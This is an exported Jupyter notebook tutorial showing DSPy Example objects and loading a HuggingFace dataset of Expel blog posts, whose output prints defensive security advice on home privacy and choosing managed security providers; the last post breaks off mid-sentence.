<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<ul>
<li>How much data do I need and how do I collect data for my task?<ul>
<li>Concretely, you can use DSPy optimizers usefully with as few as 10 example inputs, but having 50-100 examples (or even better, 300-500 examples) goes a long way.</li>
<li>How can you get examples like these? If your task is extremely unusual, please invest in preparing ~10 examples by hand. Often times, depending on your metric below, you just need inputs and not labels, so it's not that hard.</li>
<li>However, chances are that your task is not actually that unique. You can almost always find somewhat adjacent datasets on, say, HuggingFace datasets or other forms of data that you can leverage here.</li>
<li>If there's data whose licenses are permissive enough, we suggest you use them. Otherwise, you can also start using/deploying/demoing your system and collect some initial data that way.</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<ul>
<li>DSPy <code>Example</code> objects<ul>
<li>The core data type for data in DSPy is Example. You will use Examples to represent items in your training set and test set.</li>
<li>DSPy Examples are similar to Python dicts but have a few useful utilities. Your DSPy modules will return values of the type Prediction, which is a special sub-class of Example.</li>
<li>When you use DSPy, you will do a lot of evaluation and optimization runs. Your individual datapoints will be of type Example</li>
</ul>
</li>
<li>Loading Dataset from sources<ul>
<li>One of the most convenient way to import datasets in DSPy is by using <code>DataLoader</code>. The first step is to declare an object, this object can then be used to call utilities to load datasets in different formats:<ul>
<li><code>DataLoader().from_csv(...)</code></li>
<li><code>DataLoader().from_json(...)</code></li>
<li><code>DataLoader().from_parquet(...)</code></li>
<li><code>DataLoader().from_pandas(...)</code></li>
<li><code>DataLoader().from_huggingface(...)</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[17]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">qa_pair</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">Example</span><span class="p">(</span><span class="n">question</span><span class="o">=</span><span class="s2">"This is a question?"</span><span class="p">,</span> <span class="n">answer</span><span class="o">=</span><span class="s2">"This is an answer."</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">qa_pair</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">qa_pair</span><span class="o">.</span><span class="n">question</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">qa_pair</span><span class="o">.</span><span class="n">answer</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child">
<div class="jp-OutputPrompt jp-OutputArea-prompt"></div>
<div class="jp-RenderedText jp-OutputArea-output" data-mime-type="text/plain" tabindex="0">
<pre>Example({'question': 'This is a question?', 'answer': 'This is an answer.'}) (input_keys=None)
This is a question?
This is an answer.
</pre>
</div>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[18]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="c1"># Single Input.</span>
<span class="nb">print</span><span class="p">(</span><span class="n">qa_pair</span><span class="o">.</span><span class="n">with_inputs</span><span class="p">(</span><span class="s2">"question"</span><span class="p">))</span>

<span class="c1"># Multiple Inputs; be careful about marking your labels as inputs unless you mean it.</span>
<span class="nb">print</span><span class="p">(</span><span class="n">qa_pair</span><span class="o">.</span><span class="n">with_inputs</span><span class="p">(</span><span class="s2">"question"</span><span class="p">,</span> <span class="s2">"answer"</span><span class="p">))</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child">
<div class="jp-OutputPrompt jp-OutputArea-prompt"></div>
<div class="jp-RenderedText jp-OutputArea-output" data-mime-type="text/plain" tabindex="0">
<pre>Example({'question': 'This is a question?', 'answer': 'This is an answer.'}) (input_keys={'question'})
Example({'question': 'This is a question?', 'answer': 'This is an answer.'}) (input_keys={'answer', 'question'})
</pre>
</div>
</div>
</div>
</div>
</div></div></section><section><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[19]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">article_summary</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">Example</span><span class="p">(</span><span class="n">article</span><span class="o">=</span> <span class="s2">"This is an article."</span><span class="p">,</span> <span class="n">summary</span><span class="o">=</span> <span class="s2">"This is a summary."</span><span class="p">)</span><span class="o">.</span><span class="n">with_inputs</span><span class="p">(</span><span class="s2">"article"</span><span class="p">)</span>

<span class="n">input_key_only</span> <span class="o">=</span> <span class="n">article_summary</span><span class="o">.</span><span class="n">inputs</span><span class="p">()</span>
<span class="n">non_input_key_only</span> <span class="o">=</span> <span class="n">article_summary</span><span class="o">.</span><span class="n">labels</span><span class="p">()</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Example object with Input fields only:"</span><span class="p">,</span> <span class="n">input_key_only</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">"Example object with Non-Input fields only:"</span><span class="p">,</span> <span class="n">non_input_key_only</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child">
<div class="jp-OutputPrompt jp-OutputArea-prompt"></div>
<div class="jp-RenderedText jp-OutputArea-output" data-mime-type="text/plain" tabindex="0">
<pre>Example object with Input fields only: Example({'article': 'This is an article.'}) (input_keys={'article'})
Example object with Non-Input fields only: Example({'summary': 'This is a summary.'}) (input_keys=None)
</pre>
</div>
</div>
</div>
</div>
</div></section><section><div class="jp-Cell jp-CodeCell jp-Notebook-cell jp-mod-noOutputs">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[20]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">dspy.datasets</span> <span class="kn">import</span> <span class="n">DataLoader</span>

<span class="n">dl</span> <span class="o">=</span> <span class="n">DataLoader</span><span class="p">()</span>

<span class="n">blog_alpaca</span> <span class="o">=</span> <span class="n">dl</span><span class="o">.</span><span class="n">from_huggingface</span><span class="p">(</span>
    <span class="s2">"intertwine-expel/expel-blog"</span><span class="p">,</span>
    <span class="n">input_keys</span><span class="o">=</span><span class="p">(</span><span class="s2">"title"</span><span class="p">,)</span>
<span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[21]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">blog_alpaca</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child jp-OutputArea-executeResult">
<div class="jp-OutputPrompt jp-OutputArea-prompt">Out[21]:</div>
<div class="jp-RenderedText jp-OutputArea-output jp-OutputArea-executeResult" data-mime-type="text/plain" tabindex="0">
<pre>{'train': [Example({'title': '10 tips for protecting computer security and privacy at home', 'url': 'https://expel.com/blog/10-tips-protecting-computer-security-privacy-at-home/', 'date': 'Apr 23, 2020', 'contents': 'Subscribe  EXPEL BLOG 10 tips for protecting computer security and privacy at home Tips  7 MIN READ  DAVID SCHUETZ  APR 23, 2020  TAGS: Get technical / Heads up / How to Whether youre at home or at the office, theres a good chance youre relying on the internet. At the office you might have a security team who works hard to ensure your data is protected. But what about protecting your security at home? As of late, it seems like nearly everything is connected to our Wi-Fi. From multiple laptops and cell phones, to thermostats and light switches, smart technology makes our lives easier. And now in the age of social distancing, we are relying on our home networks more than ever. But the idea of being responsible for keeping your personal network connections and devices secure can be daunting. Does this mean you should live in a constant state of fear that someone will hack into your network or devices? No. But you do need to know about some steps to take to protect yourself. So  what threats should you be worried about, exactly? Most common threats For the purpose of this post, lets put vulnerabilities into three buckets  networks, endpoints and online behavior  and talk about why you should care. Networks If its connected to the internet (laptops, TVs, voice assistants, etc.), then it can probably access other devices at home. Which means there are ample opportunities for attackers to find entry as we transmit data throughout our networks. But, unless you live off the grid, you dont have much choice except to rely on the internet to function in society. Think about securing your networks like locking your doors at home. You dont want attackers to come in and steal your belongings. And you definitely dont want them using your home to conduct criminal activity (resulting in the FBI busting down your door). Opening a port on your router for a game, connecting a thermostat to the cloud, even giving a visitor your Wi-Fi password for their phone  these can all open our networks to potential threats. Luckily, there are relatively simple ways you can make sure no one is slipping in your back door while you arent paying attention (check out the 10 tips at the end of this post). I also get a lot of questions about using public Wi-Fi. Heres my advice: getting attacked while using public Wi-Fi isnt probable if you arent a big target, but it is possible. Thats why its important to be thoughtful when you are using networks outside of your home. Improve your security on public Wi-Fi by using a VPN, or avoid the Wi-Fi altogether and tether to your cell phone (ideally with a cable). Endpoints Many built-in services on laptops can create more opportunities for attackers. A well-known attack is a fake help desk call, tricking someone into granting remote access to their screen. Unless you directly call for IT support, no one needs you to share your screen or to enable remote control. Avoid keeping file sharing features like AirDrop on (and even then, set to accept files from contacts only). Turn on file sharing and remote access only when you need it, and turn it off again once youre done. Think about the apps you use, too. Be careful when installing an app that asks you to change network settings  it could be trying to watch your web traffic. And if an application asks for access to your location, contacts, or other privacy-related content, dont say Yes unless you understand exactly why its asking. As a general rule, lock your computer screen if you get up to grab a cup of coffee and put a lock on your cell phone screen. Its helpful to update your settings so your screen locks automatically after being idle for five minutes. Sure, locking screens might matter a little less if you live alone and are working from home, but these are still good habits to adopt. Online behavior Attackers often count on us to make a mistake and accidentally open the door for them. Think about the number of times you enter your bank and credit card information when youre ordering groceries from Amazon. Make sure youre shopping through reputable dealers and avoid storing your credit card information on a website. Many banks will allow you to set up text message alerts for large purchases or unusual activity  a smart feature to enable, to be on the safe side. Then theres phishing. What makes something look suspicious? Emails with a sense of urgency or a time limit, obscure invoices and warnings of disastrous outcomes are all red flags. Pop-ups that wont go away or are asking you to download something are often nefarious. Make sure you also hover over links and investigate them before clicking them. Do I need to bother mentioning that you shouldnt plug an unknown USB drive into your computer? Just in casedont do that. Dont be too quick when granting access to shared documents in G-suite or iCloud, for example. Make sure people and organizations can be vouched for and are trusted before granting access. Watch what you share on social media. Never give out your address or personal information. Hackers can search on social media sites to find answers to security questions. Tips and tricks for computer safety and privacy Weve only scratched the surface and already this looks like a lot of work. How can you make sure you arent allowing yourself to be a target without spending your entire day thinking of all the ways you can be attacked? Use these 10 tips and tricks. Create strong passwords, dont reuse them on different sites, and ALWAYS use MFA  multi-factor authentication  when given the option (these are one-time passwords, push messages, even text messages in a pinch). Also, use a password manager application! A good password manager can make it easy to select strong, unique passwords, and should support many built-in MFA systems. They can warn you if youve accidentally reused a password, or if you forgot to enable MFA. They can even alert you when sites you visit have had a recent password breach. Keep your software updated on operating systems, apps, laptops, cell phones and routers. Vendors are constantly patching bugs and security holes, some of which can be critical entry points for an attacker. Most operating systems and app stores can automatically update their software for you. Keeping your home network updated (Wi-Fi routers, etc.) isnt quite as critical, but if its been years since you looked at your router, it may be a good idea to check for updates. Use WPA2 with a strong password when setting up Wi-Fi at home. For your visitors, consider setting up a guest network with a different network name and password. Disallow remote access to your network and desktop (remote login, screen and file sharing, etc.) by disabling it on your computers and limiting the number of ports you let through the internet router. When you do need it, enable it only for the time youll be using it, and then immediately turn it back off again. Create a separate administrator account, and use a non-admin account for day-to-day activity. By keeping your administrator persona separate from your daily use account, you lessen the chance that you may accidentally install malicious software without paying attention (many of us are a little too quick to click that OK button when we are prompted). By forcing you to switch to a different account, you ensure that a random, Oh, I need your admin password now, prompt isnt going to break your computer, and makes installation of software and system-level changes a much more explicit action. Be careful with what you share online. Many sites still use secret questions to help you recover passwords. But a secret question like What brand was your first car? is only secret if that information is hard to find. Many common secret questions end up being things that people frequently share online (as part of a Facebook profile, or some forgotten tweet that might be easily searched for). Still others may be found from common data aggregation services  its surprisingly easy to find the last five home addresses for just about anyone, often for no charge. Also, you should be careful not to give away too much about where you are (Im in Europe for a month, and our dogs are at the kennel, so our big suburban home in the wooded neighborhood is COMPLETELY UNATTENDED.) Its not likely that burglars are trolling social media to find targets, but you shouldnt make it too easy for them, either. Be thoughtful about the apps you install and always download from a trusted app store when possible. The big app stores (Apple, Google, etc.) do a pretty good job of making sure that malicious software is kept out, and sticking to just those sources will go a long way to keeping you safe and secure. Whenever something (especially a website) prompts you to download a special app, dont download it right then and there. Instead, note what the file is (or does) and try to find it, or a suitable equivalent, in one of the main app stores. Even if you cant find it in the app store, if you can independently source it on the web, rather than taking the version the website just offered, thats usually a better plan. Have a keen eye for phishing and social engineering. Scams still come through email more than any other method, but the phone is a growing source of computer attacks. The most common is some variant of a help desk calling to warn you that your computer is compromised, and asking you to do things to help them secure it (which instead just opens it up to their attacks). Plus there are all manner of old-school confidence tricks that people still succeed in pulling off, through phone calls, text messages and email. Learn how to recognize these, and swiftly ignore them when they happen (hang up, delete, etc.). If your router (and tech-fu) supports it, put all your internet of things, er, things (security cameras, baby monitors, refrigerators, smart-locks, etc.) on a totally separate network with its own access point. This is a great place to put your guest network as well, though theyll lose the ability to interact with your TV, etc. Backups, backups, BACKUPs! Backing up your data is a pain. Do it anyways. Follow the 3-2-1 rule: Keep 3 copies of your data; on 2 different systems (for example, one in the den, one in the basement); and 1 off-site (like at a friend or relatives house). Keeping two copies at home protects you against a single computer failure or breach, keeping one outside of the house protects you against a house fire. Cloud based services like Backblaze are fantastic for offsite backups. Have a question about keeping your stuff secure at home? Weve got lots of security nerds over here whod love to help you. Just send us a note .'}) (input_keys={'title'}),
  Example({'title': '12 revealing questions to ask when evaluating an MSSP or ...', 'url': 'https://expel.com/blog/12-revealing-questions-when-evaluating-mssp-mdr-vendor/', 'date': 'Feb 19, 2019', 'contents': 'Subscribe  EXPEL BLOG 12 revealing questions to ask when evaluating an MSSP or MDR vendor Tips  9 MIN READ  YANEK KORFF  FEB 19, 2019  TAGS: How to / Managed security / Planning / Selecting tech / Tools Over the last 20 years, weve heard all kinds of interesting questions as prospective customers evaluate which type of managed cybersecurity service is right for them. The questions are often buried in a big spreadsheet, otherwise known as a request for proposal (RFP). Some of them are remarkably well thought out and put together. However, the vast majority follow a well-worn path and are kind of predictable (check out Gartners MSSP RFP Toolkit for some of the greatest hits). But the thing about predictable questions is they generate  you guessed it  predictable answers that leave one provider sounding a lot like the rest. So in an attempt to arm you with a few questions thatll make your prospective MSSP or managed detection and response (MDR) provider stop and think, weve compiled a short list of revealing questions that we think any service provider should be able to answer with flying colors. (Although sadly, we find that many dont.) Without further ado, here we go. Can you provide an example of ways youve adapted your service to your customers environments? You know as well as we do that one size doesnt fit all. Your industry, your geography, your company, your strategy, your tactics, your team  all of these variables mean every company is different. Even if you find a service provider thats a good fit today, will they adapt so they can be a good fit tomorrow? How will they continue to tune their service so youre always getting what you need? Many providers will talk about business context. Its a bit of a holy grail to security service providers so make sure you understand what it is and how it works. Can your provider differentiate an attacker from that weird PowerShell blip when Jenna the sysadmin runs her same PowerShell command every Wednesday morning? Can they react faster if the CFO gets phished? Are they able to ignore PUP/PUA at one customer because its noise, but report it every time at another because its the CISOs priority? Without this ability, over time youll feel like youre being served the same gruel day after day. How long, on average, did it take to fully onboard your last 10 customers, and at what point did you consider the onboarding complete? There are few activities in the managed security space that evoke more dread than onboarding. Notorious for exceptionally long, complex and error-prone disasters rife with miscommunication, onboarding roadmaps and project plans can get complex quickly. Whats worse, success may mean one thing to the provider and something else to you. But it doesnt have to be this way. During the RFP process, make sure you understand what activities mark the onboarding process as being complete and ask your provider how long it took them to go through that process for their last 10 customers. Get real data. Or, even better, ask the provider if some of these customers can be references and validate this data. Remember, onboarding time has three components: calendar time (end to end how long it took), your organizations time (how much new customers have to do, and how long it takes) and the providers time (you should care about this because it contributes to component #1  calendar time). One last #protip for ya: ask your provider if youre going to have to pay for service during onboarding. Can you use my existing security technology or will you require that we implement new technology? Youd think this one would be obvious, but many providers will mandate that you either buy new technology, add their technology (because they wont use what you already have) or introduce a duplicate technology (usually their SIEM) because their architecture demands it. A service provider in this space should be using the technology you already have in play and operationalizing it. That means ingesting the data your security products are already producing, analyzing that information and delivering answers about what matters and what doesnt. Now, not all technology is created equal. Some categories of security tech are best suited to detection, other categories are more useful when youre investigating an incident or proactively hunting for bad things in your environment. Youll want to make sure the tech you have in place can actually do what it needs to do. That said, this shouldnt come across as a requirement from your MSSP or MDR  a provider should not tell you that you need to buy this and that for anything to work. Instead, you should get a higher fidelity answer like: Without an endpoint detection and response (EDR) tool, our ability to investigate will be limited, as will our hunting capability  some of which relies on EDR. How does your detection and response strategy differ among on-prem technology, cloud infrastructure and cloud applications? We monitor your AWS, Azure and O365 environments for threats and respond immediately! Have you heard this one before? This isnt an answer. The way you differentiate between providers that speak cloud and those that dont is by listening closely to their detection and response philosophy. Whats different about security in the cloud versus on-prem? How are the approaches they take for static versus elastic cloud infrastructure different? Or are they? What about cloud applications? How do they think about the security of configuration settings versus the security of data residing in containers? Validating a security providers ability to handle your cloud security is one of the more challenging aspects in the assessment process. Consider looping in people from your own organization that are responsible for your cloud strategy and implementation. Theyll ask good questions and can help you evaluate the answers you receive. How will we work together during a security incident? When a security incident arises, communication is key. You and your service provider begin in a fog of war. Keeping exceptional clarity on what we know and what we dont know for sure yet is essential to navigate the investigation and response process that follows. Understanding how your provider will communicate this info (and how quickly) is important. Do you have to log into a portal and review a mostly static page updated once every few hours? Thats a useful artifact, but not a useful communication method. Do you submit a ticket? Ugh. Instead, look for effective methods that include rapid info sharing and multi-person communication. Of course, during an incident youll have to communicate with all sorts of people  inside and outside of your organization. Your service provider might have relationships with law firms who have experience in breach communications. They may also have relationships with incident response providers who can show up on-site at a moments notice. Either way, do your own research and find firms that are a good fit for your organization. Of course, its always easier to do this before an incident than during one. Running your own incident response tabletop exercises can reveal a lot (weve even created a role-playing game to try and make it fun  give it a go and let us know what you think). Can you provide an example of a time you learned something from a customer that improved your service? A security service that fails to learn and grow isnt actually a security service. Its  well, were not sure what it is, but at the end of the day its pretty useless to you. Sure, it might provide the illusion of security, but in reality theres a lot of time spent turning cranks that produce nothing. Weve heard this complaint from more than a few CISOs: My MSSP is a black box. I put my money in and nothing comes out. Your prospective service provider should have crisp examples of how theyve learned and improved the way they help all of their customers. And it should be material. Not something simple like, I found this threat here so I added it to my intel database. Thats table stakes. What caused your service provider to rethink something and say to themselves, I think the way were tackling this is wrong based on this customer feedback  lets do it differently? Demonstrating the ability to adapt ensures your service provider will grow with you. How will you give me the visibility I need to be confident that youre making the right decisions for my organization? Dont just trust, but verify. Its what youre paying your service provider to do after all, so you should have confidence not only that theyre doing the right thing  but that theyre doing it right too. Take a moment to think through the steps that comprise security operations. Triage. This is the process analysts go through to evaluate (often quickly) whether something is a false positive or warrants investigation. Sometimes these analysts are humans. Sometimes theyre robots. Does your provider tell you both who made the decision and why? If they filter out something important very early but were wrong, thats a problem. Investigations. Will your provider show you what information their analysts pulled from your environment? Can you get a sense of the thought process they use to decide what to retrieve? And what to make of it? This is where expertise really comes into play. Reporting and response. Is the output you receive easy to understand? Are response actions clear, and do you have control over who-gets-to-meddle-with-what in your infrastructure? If you have to translate everything your provider is telling you so that mere mortals who dont speak security can understand it, thatll become frustrating  fast. As you take a step back and look through whats been done, does the provider have timestamps for every step that was taken so you can evaluate this information and measure whether their overall performance is improving or degrading? Ultimately, you have to answer this question: Did they show their work? Thats the only way to verify that theyre doing what youre paying them to do. When things start to break, how (quickly) do you find and fix the problem? When do I find out about it? If youve worked with an MSSP before, youre familiar with this problem were about to summarize. Nine months after a piece of technology stopped sending data, the provider found out it was broken. Because you told them. Thats a big hit to your visibility and a lot of risk you took on without any warning. Not cool. How will your new prospective provider handle this? Can they detect when a device becomes unreachable? How fast? What about if the device stays online but stops sending data? Or worse  what if theres a significant and unexpected drop in data volume? Whos responsible for monitoring this stuff and how quickly can they recover? Get examples if you can, and bonus points if they provide you direct visibility into this kind of monitoring. How did you identify and report on an active red team engagement conducted on one of your customers networks? Yeah, we know this one feels pretty specific, but weve run into too many instances where customers brought in a relatively sophisticated red team partner only to discover their managed security provider was blind to these mock adversaries. They couldnt even detect them, let alone investigate or respond. To be clear, when we say red team , were talking about a group of whitehats who try to break into your network, escalate privileges, move laterally and steal stuff  and then report on things you can do to improve your defenses. Can your new potential partner provide an example of this exercise playing out? How did they detect the attacker in this case and to what extent were they able to provide ongoing reporting? Once again, bonus points for the provider if theyll let you hear all of this directly from one of their current customers. When I have a question or concern how do I engage with your team? We talked about communication during an incident. What about when theres no incident? Is it the same process, or are there two different processes? The more you have to adapt to your providers modes of communication, the less likely youll remember to do the right thing when the time is right. Watch out for laggy ticketing systems and be cautious about support portals where the identity of the people youre talking to is hidden. Your partners security analysts will have exceptionally generous access to your data. You should be able to get to know who they are and interact with them directly from time to time. Can you show me how you calculate the price of your service? Every provider will give you a price. But can you understand how and why they got to that number? Be wary of long rambling answers. If your prospective provider cant give you a crisp answer or, better yet, quote you a price on your first sales call, imagine how the conversation will go once you become their customer. If selected, can you provide a free 30-day proof of concept to demonstrate you can deliver on the expectations youve set? After youve asked all of your questions, appraised the responses and picked a winner theres a good chance youll still be asking yourself, Can they really do all of these great things in my environment? Exaggerated sales and marketing claims are, unfortunately, one of the biggest scourges on the security industry. You dont want to get a few weeks into a new agreement and learn your new provider cant do everything they promised or, even worse, find out when they missed something important. One of the most effective ways to mitigate this risk is to hop on your providers service on an interim basis. It gives you a chance to get a feel for what the interactions will be like and gives your potential partner an opportunity to prove themselves. And if your prospective service provider cant even get this operational within 30 days? Well, that tells you all you need to know. So there you have it. Twelve questions that can help you sleuth out what it will be like to work with your managed security provider. If youve got other questions, wed love to hear them. Or if youre reading this and thinking maybe Ill just build my own SOC, check out our post on all the things youll need to consider if youre thinking of building a 247 SOC.'}) (input_keys={'title'}),
  Example({'title': "12 ways to tell if your managed security provider won't suck ...", 'url': 'https://expel.com/blog/12-ways-to-tell-managed-security-provider-wont-suck-next-year/', 'date': 'Mar 22, 2019', 'contents': 'Subscribe  EXPEL BLOG 12 ways to tell if your managed security provider wont suck next year Security operations  9 MIN READ  YANEK KORFF  MAR 22, 2019  TAGS: CISO / How to / Managed security / Selecting tech / Tools I used to love my iPhone. Now, at best, it works fine when new features arent getting in my way. I also remember when AOL was amazing, ICQ was the best chat client and Netscape was the go-to browser. Maybe its inevitable that the things we love will eventually be superseded, though hopefully not too quickly. Lets take a look at security operations. Turning logs and other forms of security signal into useful actions is an activity thats been around for decades. Whether companies have their own internal capability or have outsourced to a managed security provider, the breach headlines have continued unabated. Okay, thats not entirely true  theyve accelerated. And yet, even in this morass that is the security industry, every once in a while youll find someone truly delighted about the products or services theyre using. But delighted customers are the exception when it comes to managed security service providers (MSSPs). Some will tell you that MSSPs take your money and give you nothing in return or that theyre a black stain on our industry. In fact, according to Forresters 2017 Global Business Technographics Security Survey, 34 percent of responding organizations were actively evaluating alternatives or actively planning replacement of their existing MSSP . In an industry where three-year contracts are common, a third of the market was in the process of switching at the time of the survey. Math doesnt paint a pretty picture here. In this ten billion dollar industry thats growing nearly 10 percent each year, thousands of companies are beyond disgruntled: theyre looking to get rid of their current provider. If youre somewhere in that one-third of the market thats looking to switch to another MSSP, youre probably thinking to yourself, I thought my provider would be better  and they were for a little while. Then it all went down the toilet. So, before you sign that next contract how do you determine the likelihood that the quality of the service will last? How long will you be happy with the quality of your service provider? You might be able to get a sense of this through a proof-of-concept exercise but that wont tell you much about how youll feel a year (or five) from now. Delighters will become table-stakes over time  so, to truly satisfy you, any new service will have to do more than just not deteriorate. It has to improve. Constantly. Creating a culture that searches for quality Why is it so essential that quality is core to your providers DNA? Well, because its already part of yours. Youve got a limited budget and a part of your job is to get the most bang for your buck over time. So youll constantly be changing your investments to ensure youre getting the most for your money. A dollar you spend a year from now should be doing more than a dollar today. This translates directly to your service provider: an hour of work your service provider does today had better do more for you a year from now than it does right this minute. This means everyone (yes, everyone) at your service providers organization needs to be looking at ways to improve quality constantly. So how can you tell if an organizations got it? Here are some key characteristics that weve seen that create an environment where a persistent focus on quality can emerge: People feel a sense of trust and psychological safety, People have ownership of the problems theyre trying to solve, People have the energy to engage in quality-seeking behaviors, and People can honestly self-assess throughout the process. Youre probably thinking that sounds pretty soft and squishy. So how do you assess whether a company youre talking to has built this sort of culture? Well, without further ado, here are a dozen things you can do to sniff out whether the search for quality exists at an organization. 1. In search of trust  look for transparency Transparency means more than just being forthcoming. It means making the effort to be easily understood. Theres no shortage of places you can go to find examples of an orgs transparency. Start with the website and see if you can figure out what the company does and how they do it. As you ask questions to fill in the gaps, take note of whether you can understand the answers or if theyre wrapped in marketing buzzwords or technical mumbo-jumbo. See how deeply transparency extends into the organization. Spend some time to understand the companys high-level goals. As you run into various employees in your evaluation process, ask them what these goals are and what they think about them. Ask whats going well and whats challenging. If employees cant (or wont) be forthcoming when theyre literally trying to sell you something, what are the chances theyll be honest when they screw up? 2. In search of trust  look for simple execution Trust is a fickle thing. As we approach new relationships, we come with some amount of default trust in the new partner. I like to call this the trust bank. If youve had your trust violated a little too often, you wont be very generous when it comes to initial your initial deposit in the trust bank. If youre a bit more optimistic you might make a huge trust deposit up front, thinking the best of people. The unfair thing about trust banks is that deposits are always small, but withdrawals are easily five times as large. During your conversations, the service provider will promise to do many things. Theyll send you a summary. Theyll put you in touch with another customer. Theyll get you on the phone for a chat with someone with greater technical depth in an area thats important to you. Theyll promise you a quote. Do they follow through on those things? And do they meet the expectations they set within the timeframes they promised? It is surprisingly difficult for people to consistently meet simple obligations like doing what they said theyd do. So when you find that in an organization, it really stands out. 3. In search of trust  look for failure Its easy to provide examples of past successes. Its a lot harder to admit failure. Youre about to sign up for a long-term service. Youve got a right to know what sort of problems there will be. How will they be identified, communicated and handled? Ask for an example, and ask for artifacts (redacted and/or anonymized presumably). Get the full story and ask a lot of questions to fill in the blanks. An organization that knows how to handle failures and turn them into success stories is well positioned to earn (and keep) your trust. 4. In search of ownership  identify roles and responsibilities Youll have the opportunity to meet several people at a potential provider during the courtship process. Pick two or three different roles and get a copy of their job description (this may or may not be whats posted on the companys website). Ask those employees what their responsibilities are and make sure things line up. Do employees seem to understand where their responsibilities start and end? Can they point to other teams within the org and tell you how the teams work together? Sounds pretty basic, but having a strong sense of ownership often breaks down when this foundation is missing. 5. In search of ownership  ask about projects When youre meeting with mid-level and senior people at the organization who arent part of the management team, ask about what theyre working on. Usually, technical people are more than happy to share some of the projects they have in flight. Then, ask why theyre working on those projects. In organizations where employees feel a strong sense of ownership, they look at their work not as tasks, but as solving business problems or customer problems. They articulate their work in the context of something greater. 6. In search of energy  ask about work and life People think about work/life balance differently. As you interact with people at your service provider, ask them how they view the work/life balance at the company. Does it meet their needs? Do they get vacation time? Sick leave? How much? Do people actually take vacation? Do people feel like they can disconnect? In environments where there are lots of single points of failure, people tend to work hard constantly, be stressed out and make more mistakes. While this might happen from time to time due to shifts in staffing, it shouldnt be the norm. On the other hand, where people feel like they get the space they need to bring all their enthusiasm to bear, theyll do better work and youll be happier for it. 7. In search of energy  ask about celebrations and praise One of the factors that contributes the most to quality work is recognition that individuals and teams have done well. Contrast this with environments in which the beatings will continue until morale improves. Yeah, youve been there and seen that. Ask about the last few company events, what they were and why they happened. What were they 